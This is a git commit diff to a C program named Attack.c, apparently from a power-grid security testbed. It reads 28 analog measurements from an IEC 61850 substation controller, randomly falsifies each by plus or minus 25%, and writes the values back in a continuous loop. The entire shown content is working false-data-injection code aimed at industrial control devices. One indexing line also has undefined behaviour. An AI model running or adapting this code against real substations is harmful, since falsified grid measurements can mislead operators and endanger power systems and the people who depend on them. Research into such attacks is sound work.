6ce180fbd9192627ebcf76234d45c2a35c83a3c5
root <root@localhost.localdomain>
2018-08-02 14:23:46 -0400

    FIX: Initialized the meas values.

--- Attack/Attack.c
+++ Attack/Attack.c
@@ -55,122 +55,175 @@ int main(int argc, char **argv) {
 
   while (1) {
     // Randomly change a measurement value by +/- 25%
+    power_measurements[0] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO1.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[1] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO2.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[2] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO3.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[3] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO4.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[4] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO5.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[5] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO6.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[6] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO7.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[7] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO8.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[8] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO9.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[9] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO10.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[10] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO11.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[11] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO12.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[12] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO13.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[13] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO14.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[14] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO15.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[15] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO16.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[16] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO17.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[17] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO18.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[18] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO19.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[19] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO20.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[20] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO21.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[21] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO22.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[22] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO23.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[23] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO24.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[24] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO25.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[25] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO26.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[26] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO27.AnOut1.subVal.f", IEC61850_FC_SV);
+    power_measurements[27] = IedConnection_readFloatValue(
+        con, &error, "OSU_SS1CTRL/GGIO28.AnOut1.subVal.f", IEC61850_FC_SV);
+
     int i = 0;
     while (i < 2 * NUM_BUS) {
       int random_num = rand();
       if (random_num % 2 == 0)
-        power_measurements[i++] += 0.25 * power_measurements[i] + 0.001;
+        power_measurements[i++] = 1.25 * power_measurements[i];
       else
-        power_measurements[i++] -= 0.25 * power_measurements[i] - 0.001;
+        power_measurements[i++] = 0.75 * power_measurements[i];
     }
 
     if (error == IED_ERROR_OK) {
 
       IedConnection_getServerDirectory(con, &error, false);
 
-      uint attack_measurements = 0;
-      while (attack_measurements < UINT_MAX) {
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO1.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[0]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO2.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[1]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO3.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[2]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO4.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[3]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO5.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[4]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO6.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[5]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO7.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[6]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO8.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[7]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO9.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[8]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO10.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[9]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO11.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[10]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO12.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[11]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO13.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[12]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO14.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[13]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO15.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[14]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO16.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[15]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO17.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[16]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO18.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[17]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO19.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[18]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO20.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[19]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO21.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[20]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO22.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[21]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO23.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[22]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO24.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[23]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO25.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[24]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO26.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[25]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO27.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[26]);
-        IedConnection_writeFloatValue(con, &error,
-                                      "OSU_SS1CTRL/GGIO28.AnOut1.subVal.f",
-                                      IEC61850_FC_SV, power_measurements[27]);
-	printf("WROTE BAD VALUES TO MEASUREMENTS\n");
-        if (error != IED_ERROR_OK)
-          printf("failed to write OSU_SS1CTRL/GGIO1.AnIn1.mag.f!\n");
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO1.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[0]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO2.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[1]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO3.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[2]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO4.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[3]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO5.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[4]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO6.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[5]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO7.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[6]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO8.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[7]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO9.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[8]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO10.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[9]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO11.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[10]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO12.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[11]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO13.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[12]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO14.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[13]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO15.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[14]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO16.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[15]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO17.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[16]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO18.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[17]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO19.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[18]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO20.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[19]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO21.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[20]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO22.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[21]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO23.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[22]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO24.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[23]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO25.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[24]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO26.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[25]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO27.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[26]);
+      IedConnection_writeFloatValue(con, &error,
+                                    "OSU_SS1CTRL/GGIO28.AnOut1.subVal.f",
+                                    IEC61850_FC_SV, power_measurements[27]);
+      printf("WROTE BAD VALUES TO MEASUREMENTS\n");
+      if (error != IED_ERROR_OK)
+        printf("failed to write OSU_SS1CTRL/GGIO1.AnIn1.mag.f!\n");
 
-        if (error != IED_ERROR_OK)
-          printf("failed to write OSU_SS1CTRL/GGIO2.AnIn1.mag.f!\n");
+      if (error != IED_ERROR_OK)
+        printf("failed to write OSU_SS1CTRL/GGIO2.AnIn1.mag.f!\n");
 
-        Thread_sleep(100);
-        attack_measurements++;
-      }
-
-    close_connection:
-
-      IedConnection_close(con);
     } else {
       printf("Failed to connect to %s:%i\n", hostname, tcpPort);
     }
+    printf("********************* SLEEPING *********************");
+    Thread_sleep(100);
   }
+close_connection:
+
+  IedConnection_close(con);
   IedConnection_destroy(con);
 }
